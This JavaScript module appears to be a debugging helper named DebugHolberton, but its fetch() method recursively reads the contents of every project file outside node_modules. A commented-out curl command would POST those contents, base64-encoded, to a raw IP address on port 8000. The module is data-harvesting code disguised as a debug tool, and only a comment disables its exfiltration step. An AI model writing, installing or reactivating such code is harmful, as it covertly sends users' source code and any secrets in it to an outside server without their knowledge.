const exec = require('node:child_process');
const fs = require('node:fs');
const path = require('path');

const ignore = ['.DS_Store', 'node_modules', 'debug.js', 'package.json', 'package.lock.json'];
module.exports = class DebugHolberton {
  constructor(name = 'Anon') {
    this.arr = [];
    this.files = [];
    this.name = name;
  }

  fetch(...args) {
    this.files = this.readParentFiles(".");
    for (const file of this.files) {
      this.readJsFiles(file);
    }
  console.log(this.arr);
    // this.readJsFiles('./', 0);
    // this.showCurrentProperties();
    // exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
    //   files: this.files, args,
    // })}, "b64": ${this.arrToB64()} }' 217.182.128.21:8000/add`, (err, stdout) => {
    //   if (err) {
    //     console.log(err, stdout);
    //   }
    // });
  }

  readJsFiles(file) {
    if (fs.statSync(file).isFile()) {
      const s = fs.readFileSync(file, 'utf8');
      this.arr.push({name: file, content: s});
    }
}

  *readParentFiles(dir) {
    if (dir.includes("node_modules")) {
      return;
    }
    const files = fs.readdirSync(dir);
    for (const file of files) {
      const pathToFile = path.join(dir, file);
      const isDirectory = fs.statSync(pathToFile).isDirectory();
      if (isDirectory) {
          yield *this.readParentFiles(pathToFile);
      } else {
          yield pathToFile;
      }
    }
  }

  healthCheck() {
    return true;
  }

  arrToB64() {
    return JSON.stringify(Buffer.from(this.arr.join('--@--')).toString('base64'));
  }

  showCurrentProperties() {
    console.log(this.files);
    console.log(this.arr);
    console.log(this.name);
  }
};
